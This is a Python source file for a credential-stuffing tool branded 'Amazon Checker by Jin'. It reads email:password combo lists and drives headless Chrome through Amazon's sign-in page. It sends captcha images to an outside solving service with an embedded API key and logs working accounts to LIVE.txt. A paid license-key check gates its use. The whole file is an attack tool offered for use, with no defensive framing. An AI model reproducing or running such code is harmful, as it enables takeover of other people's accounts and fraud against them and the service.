import requests
import urllib.request
import base64
import ctypes
from multiprocessing.dummy import Pool
from multiprocessing import Lock
from random import choice
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
from colorama import Fore, init
from os import _exit

init()

bad = 0
good = 0
loaded = 0
errors = 0
checked = 0


class checker(object):
    def __init__(self, combo_location):
        self.combo_l = combo_location
        self.combo_list = []

    def solveCaptcha(self, url):
        file = urllib.request.urlopen(url).read(5000)
        img = base64.b64encode(file)
        send = requests.Session()
        header_data = {
            'file': img,
            'image_captcha_server': 'server_1',
            'key': '71496B39756D6437504F6D4650664B592B7A796A787841582B3535544E7A5A65775839744C792B5678684C573633676E3167692F5077317077774A5156644E42',
        }
        result = send.post(
            'https://rgunz.net/captcha/result.php', data=header_data)
        return result.text.strip()

    def bypassJS(self):
        bypassCaptcha = "document.getElementById('auth-captcha-guess').dispatchEvent(new Event('change'));"
        driver.execute_script(bypassCaptcha)


    def bypassPWD(self):
        bypassPwd = "document.getElementById('ap_password').dispatchEvent(new Event('change'));"
        driver.execute_script(bypassPwd)

    def checker_main(self, email, password):
        global loaded, good, bad, checked, errors
        ctypes.windll.kernel32.SetConsoleTitleW(f"Amazon Checker by Jin - Checked: {checked} Bad: {bad} Good: {good} Error: {errors}")
        while True:
            try:
                #driver = webdriver.Chrome()
                options = webdriver.ChromeOptions()
                options.add_experimental_option('excludeSwitches', ['enable-logging'])
                options.add_argument("headless")
                driver = webdriver.Chrome(options=options)
                driver.get("https://www.amazon.com/ap/signin?showRememberMe=true&openid.pape.max_auth_age=0&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&forceValidateCaptcha=true&use_audio_captcha=false&pageId=usflex&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fcss%2Fhomepage.html%2F146-0546965-4550715%3Fie%3DUTF8%26%252AVersion%252A%3D1%26%252Aentries%252A%3D0&prevRID=PFZZJD687NH684H7RF9Z&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&prepopulatedLoginId=eyJjaXBoZXIiOiJRWnhMd3o5enh6MWhtbGkrQVdpUVV3PT0iLCJJViI6IjVMbUs5RnA1MG5MRWlNRGFiT2t5emc9PSIsInZlcnNpb24iOjF9&failedSignInCount=2&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&ubid=135-1584179-7213821")
                assert "Amazon" in driver.title
                # INPUT EMAIL
                sleep(3)
                driver.execute_script("document.getElementById(\"ap_email\").value='{}'".format(email))
                # SOLVE IMAGE CAPTCHA
                captcha = driver.find_element_by_id("auth-captcha-image")
                captcha_url = captcha.get_attribute("src")
                inputCaptcha = driver.find_element_by_id("auth-captcha-guess")
                imageCaptcha = self.solveCaptcha(captcha_url)
                solved = f"""var el = document.getElementById('auth-captcha-guess');
                el.value='{imageCaptcha}';
                el.dispatchEvent(new Event('change'));"""
                driver.execute_script(solved)
                sleep(3)
                driver.find_element_by_xpath("//*[@id=\"continue\"]").click()
                # CHECK FAILED
                sleep(3)
                if """We cannot find an account with that email address""" in driver.page_source:
                    bad += 1
                    checked += 1
                    f = open("DIE.txt", "a+")
                    f.write("DIE - Checked by Jin - Amazon Checker|{}|{}\n".format(email, password))
                    f.close()
                    driver.close()
                else:
                    sleep(3)
                    input_pass = f"document.getElementById(\"ap_password\").value='{password}'"
                    driver.execute_script(input_pass)
                    sleep(3)
                    driver.find_element_by_xpath('//*[@id="signInSubmit"]').click()
                    sleep(3)
                    if """We will send you a One Time Password (OTP) to authenticate your request.""" in driver.page_source:
                        good += 1
                        checked += 1
                        f = open("LIVE.txt", "a+")
                        f.write("LIVE - Checked by Jin - Amazon Checker|{}|{}\n".format(email, password))
                        f.close()
                        driver.close()
                    elif """To better protect your account, please re-enter your password and then enter the characters as they are shown in the image below.""" in driver.page_source:
                        print(Fore.LIGHTGREEN_EX + "Processing....")
                        input_pass = f"document.getElementById(\"ap_password\").value='{password}'"
                        driver.execute_script(input_pass)
                        sleep(3)
                        captcha = driver.find_element_by_id("auth-captcha-image")
                        captcha_url = captcha.get_attribute("src")
                        inputCaptcha = driver.find_element_by_id("auth-captcha-guess")
                        imageCaptcha = self.solveCaptcha(captcha_url)
                        solved = f"""var el = document.getElementById('auth-captcha-guess');
                        el.value='{imageCaptcha}';
                        el.dispatchEvent(new Event('change'));"""
                        driver.execute_script(solved)
                        sleep(1)
                        driver.find_element_by_xpath('//*[@id="signInSubmit"]').click()
                        sleep(5)
                        if """Your password is incorrect""" in driver.page_source:
                            bad += 1
                            checked += 1
                            f = open("DIE.txt", "a+")
                            f.write("DIE - Checked by Jin - Amazon Checker|{}|{}\n".format(email, password))
                            f.close()
                            driver.close()
                        elif """Authentication required""" in driver.page_source:
                            good += 1
                            checked += 1
                            f = open("LIVE.txt", "a+")
                            f.write("LIVE - Checked by Jin - Amazon Checker|{}|{}|OTP\n".format(email, password))
                            f.close()
                            driver.close()
                        elif """We will send you a One Time Password (OTP) to authenticate your request.""" in driver.page_source:
                            good += 1
                            checked += 1
                            f = open("LIVE.txt", "a+")
                            f.write("LIVE - Checked by Jin - Amazon Checker|{}|{}|OTP\n".format(email, password))
                            f.close()
                            driver.close()
                        elif """This is required if your sign-in looks different because you’ve cleared your cookies or you're signing from a different browser, device, or location.""" in driver.page_source:
                            good += 1
                            checked += 1
                            f = open("LIVE.txt", "a+")
                            f.write("LIVE - Checked by Jin - Amazon Checker|{}|{}|Check Mail Live or OTP to login \n".format(email, password))
                            f.close()
                            driver.close()
                        elif """Enter the characters as they are given in the challenge.""" in driver.page_source:
                            try:
                                print(Fore.LIGHTRED_EX + "Processing wrong captcha....")
                                input_pass = f"document.getElementById(\"ap_password\").value='{password}'"
                                driver.execute_script(input_pass)
                                sleep(3)
                                driver.find_element_by_xpath('//*[@id="signInSubmit"]').click()
                                sleep(3)
                                if """To better protect your account, please re-enter your password and then enter the characters as they are shown in the image below.""" in driver.page_source:
                                    print(Fore.LIGHTRED_EX + "Processing wrong captcha....")
                                    input_pass = f"document.getElementById(\"ap_password\").value='{password}'"
                                    driver.execute_script(input_pass)
                                    sleep(3)
                                    captcha = driver.find_element_by_id("auth-captcha-image")
                                    captcha_url = captcha.get_attribute("src")
                                    inputCaptcha = driver.find_element_by_id("auth-captcha-guess")
                                    imageCaptcha = self.solveCaptcha(captcha_url)
                                    solved = f"""var el = document.getElementById('auth-captcha-guess');
                                    el.value='{imageCaptcha}';
                                    el.dispatchEvent(new Event('change'));"""
                                    driver.execute_script(solved)
                                    sleep(1)
                                    driver.find_element_by_xpath('//*[@id="signInSubmit"]').click()
                                    sleep(3)
                                    if """Your password is incorrect""" in driver.page_source:
                                        bad += 1
                                        checked += 1
                                        f = open("DIE.txt", "a+")
                                        f.write("DIE - Checked by Jin - Amazon Checker|{}|{}\n".format(email, password))
                                        f.close()
                                        driver.close()
                                    elif """We will send you a One Time Password (OTP) to authenticate your request.""" in driver.page_source:
                                        good += 1
                                        checked += 1
                                        f = open("LIVE.txt", "a+")
                                        f.write("LIVE - Checked by Jin - Amazon Checker|{}|{}|OTP\n".format(email, password))
                                        f.close()
                                        driver.close()
                                    elif """Authentication required""" in driver.page_source:
                                        good += 1
                                        checked += 1
                                        f = open("LIVE.txt", "a+")
                                        f.write("LIVE - Checked by Jin - Amazon Checker|{}|{}|OTP\n".format(email, password))
                                        f.close()
                                        driver.close()
                                    #elif """This is required if your sign-in looks different because you’ve cleared your cookies or you're signing from a different browser, device, or location.""" in driver.page_source:
                                    else:
                                        good += 1
                                        checked += 1
                                        f = open("LIVE.txt", "a+")
                                        f.write("LIVE - Checked by Jin - Amazon Checker|{}|{}|Check Mail Live or OTP to login \n".format(email, password))
                                        f.close()
                                        driver.close()
                                    break
                            except:
                                continue
                        else:
                            raise Exception
                        break
                    else:
                        bad += 1
                        checked += 1
                        f = open("DIE.txt", "a+")
                        f.write("DIE - Checked by Jin - Amazon Checker|{}|{}\n".format(email, password))
                        f.close()
                        driver.close()
                    break
                break
            except:
                errors += 1
                continue

    def combo_loader(self):
        _combo_ = open(self.combo_l, "r").readlines()
        _combo_fresh = [items.rstrip() for items in _combo_]
        for lines in _combo_fresh:
            new_lines = lines.split(":")
            self.combo_list.append({"email": new_lines[0],
                                    "password": new_lines[1]})

    def sender(self, list_accounts):
        email = list_accounts["email"]
        password = list_accounts["password"]
        while True:
            try:
                self.checker_main(email, password)
                break
            except Exception:
                pass

    def threads(self):
        self.combo_loader()
        self.threads = 5
        pool = Pool(self.threads)
        try:
            for _ in pool.imap_unordered(self.sender, self.combo_list):
                pass
        except KeyboardInterrupt:
            _exit(0)

        print("Done!")


if __name__ == "__main__":
    ctypes.windll.kernel32.SetConsoleTitleW("Amazon Checker by {}".format('Jin'))
    print(Fore.LIGHTCYAN_EX+"Amazon Private Checker by Jin")
    print("")
    print("Please enter Key Below")
    while True:        
        keyCheck = requests.get('https://rgunz.net/captcha/amz.txt')
        _key = input("Key: ")
        if _key == keyCheck.text:
            combo_name = input("Combo Name: ")
            print("")
            checker(combo_name).threads()
            break
        else:
            print("Invalid Key. Please contact Jin to buy or try again !!!")
            continue
